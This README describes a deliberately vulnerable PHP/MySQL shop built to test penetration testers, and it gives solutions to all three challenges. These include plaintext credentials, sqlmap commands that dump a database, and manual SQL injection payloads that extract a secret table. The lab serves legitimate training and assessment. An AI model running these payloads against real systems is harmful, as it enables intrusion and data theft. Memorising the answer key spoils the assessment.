# Vulnerable Web Application - Penetration Testing Assessment Tool

A deliberately vulnerable web application designed to assess penetration testers' skills during hiring processes. This application contains multiple security vulnerabilities and hidden flags for testers to discover.

## ⚠️ WARNING
**This application contains intentional security vulnerabilities. DO NOT deploy this on a production server or any publicly accessible environment. Use only in isolated, controlled testing environments.**

## Overview

This is a PHP-based web application with a MySQL database that simulates a simple e-commerce site selling "1 Piece Rubiks Cube". It contains three main security challenges with hidden flags.

## Challenges & Flags

### Challenge 1: Hidden Credentials Discovery
**Objective:** Find user login credentials from hidden field in login page source code

**Solution:** 
- View source of `login.php`
- Find hidden input field with value: `am9lOmNhbnlvdWYxbmRtMw%3D%3D`
- Decode from URL encoding → Base64 → ASCII
- Credentials: `joe:canyouf1ndm3`

**Encoding:** Base64 → ASCII hex

---

### Challenge 2: Source Code Flag Discovery
**Objective:** Find the first flag in the home page source code

**Solution:**
- Login to the application
- Navigate to home page
- View page source and scroll down
- Flag: `flag{93a4f912d658154486f2bd1b9162715f}`

**Encoding:** Base64 → ASCII hex

---

### Challenge 3: SQL Injection Attack
**Objective:** Perform SQL injection to discover the SECRET table and extract the flag

**Tools Required:** SQLMap or manual SQL injection

**SQLMap Commands:** 
\`\`\`bash
# 1. Enumerate databases and tables to find 'dcsc' DB and 'secret' table
sqlmap -u "http://localhost/contact.php" --dbs --tables --forms

# 2. Retrieve the flag from the secret table
sqlmap -u "http://localhost/contact.php" -D dcsc -T secret --dump --forms
\`\`\`

**Manual SQL Injection Payloads (The Manual Payloads MAY NOT WORK):** 
\`\`\`sql
# Time-based blind SQLi detection
' AND (SELECT 1569 FROM (SELECT(SLEEP(5)))mtZf) AND 'HJsW'='HJsW

# Union-based SQLi - Enumerate columns
' UNION SELECT NULL,NULL,'a'-- -

# Enumerate databases
' UNION SELECT NULL,NULL,schema_name FROM information_schema.schemata-- -

# Enumerate tables
' UNION SELECT NULL,NULL,table_name FROM INFORMATION_SCHEMA.TABLES-- -

# Enumerate columns in 'secret' table
' UNION SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name = 'secret'-- -

# Extract the flag
' UNION SELECT NULL,NULL,flag FROM secret-- -
\`\`\`

**Expected Flag:** `flag{[hash_value]}`

**Encoding:** Base64 → ASCII hex

---

## Prerequisites

- **Web Server:** Apache (XAMPP, WAMP, or LAMP)
- **PHP:** Version 7.0 or higher
- **MySQL:** Version 5.7 or higher
- **Operating System:** Windows, Linux, or macOS

## Installation Steps

### 1. Install XAMPP (Recommended)

Download and install XAMPP from [https://www.apachefriends.org](https://www.apachefriends.org)

### 2. Clone/Copy Project Files

Copy all project files to your web server directory:
- **Windows (XAMPP):** `C:\xampp\htdocs\level-1-box\`
- **Linux (LAMP):** `/var/www/html/level-1-box/`
- **macOS (MAMP):** `/Applications/MAMP/htdocs/level-1-box/`

### 3. Start Services

**Using XAMPP Control Panel:**
1. Open XAMPP Control Panel
2. Start **Apache** service
3. Start **MySQL** service

**Using Command Line (Linux):**
\`\`\`bash
sudo service apache2 start
sudo service mysql start
\`\`\`

### 4. Create Database

**Option A: Using phpMyAdmin (Recommended)**
1. Open browser and navigate to `http://localhost/phpmyadmin`
2. Click "Import" tab
3. Choose `database/setup.sql` file
4. Click "Go" to execute

**Option B: Using MySQL Command Line**
\`\`\`bash
mysql -u root -p < database/setup.sql
\`\`\`

**Option C: Manual Setup**
1. Open `http://localhost/phpmyadmin`
2. Create database named `dcsc`
3. Run the SQL commands from `database/setup.sql`

### 5. Verify Database Connection

The database should now be visible in phpMyAdmin at `http://localhost/phpmyadmin`

You should see the `dcsc` database with three tables: `users`, `feedback`, and `secret`

### 6. Access the Application

Open your browser and navigate to:
\`\`\`
http://localhost/level-1-box/login.php
\`\`\`

## Project Structure

\`\`\`
level-1-box/
├── README.md                 # This file
├── database/
│   └── setup.sql            # Database creation script
├── login.php                # Login page (Challenge 1)
├── register.php             # User registration
├── home.php                 # Home page (Challenge 2)
├── contact.php              # Contact/Feedback page (Challenge 3 - SQLi)
├── logout.php               # Logout functionality
├── dbconn.php               # Database connection
├── errors.php               # Error display helper
├── logincss.css             # Login page styles
└── homecss.css              # Home/Contact page styles
\`\`\`

## Usage

### For Test Administrators

1. Start the web server and database
2. Provide testers with the application URL
3. Give them the challenge objectives (without solutions)
4. Monitor their progress and techniques
5. Evaluate based on:
   - Time to discover vulnerabilities
   - Tools and techniques used
   - Documentation of findings
   - Remediation recommendations

### For Penetration Testers

1. Start with reconnaissance
2. Examine page source code
3. Test input fields for injection vulnerabilities
4. Use tools like SQLMap, Burp Suite, or manual testing
5. Document all findings with proof-of-concept
6. Provide remediation recommendations

## Default Credentials

**Test Account (Challenge 1):**
- Username: `joe`
- Password: `canyouf1ndm3`

**Database:**
- Host: `localhost`
- Username: `root`
- Password: `` (empty)
- Database: `dcsc`

## Vulnerabilities Included

1. **Information Disclosure:** Credentials in HTML source
2. **Weak Password Storage:** MD5 hashing (deprecated)
3. **SQL Injection:** Unsanitized user input in feedback form
4. **Session Management Issues:** Basic session handling
5. **No CSRF Protection:** Forms lack CSRF tokens
6. **No Input Validation:** Client and server-side validation missing

## Troubleshooting

### Database Connection Failed
- Verify MySQL service is running
- Check database credentials in `dbconn.php`
- Ensure `dcsc` database exists

### Page Not Found (404)
- Verify files are in `C:\xampp\htdocs\level-1-box\` directory
- Check Apache service is running in XAMPP Control Panel
- Confirm you're using the correct URL: `http://localhost/level-1-box/login.php`
- Do NOT try to access `dbconn.php` directly - it's an include file, not a page
- Test if Apache is working by visiting `http://localhost/` first

### PHP Errors Displayed
- This is intentional for some pages
- Check PHP error logs for actual issues

### Cannot Login
- Ensure database tables are created
- Verify user exists in `users` table
- Check password is MD5 hashed

## Security Remediation (For Learning)

**DO NOT implement these fixes if using for assessment:**

1. Use prepared statements for all database queries
2. Implement proper password hashing (bcrypt/Argon2)
3. Add CSRF tokens to all forms
4. Implement input validation and sanitization
5. Use HTTPS for all connections
6. Add rate limiting for login attempts
7. Remove sensitive information from HTML source
8. Implement proper error handling (don't expose system info)

## License

This project is for educational and assessment purposes only.

## Disclaimer

This application is intentionally vulnerable and should never be deployed in a production environment. The creators are not responsible for any misuse of this application.
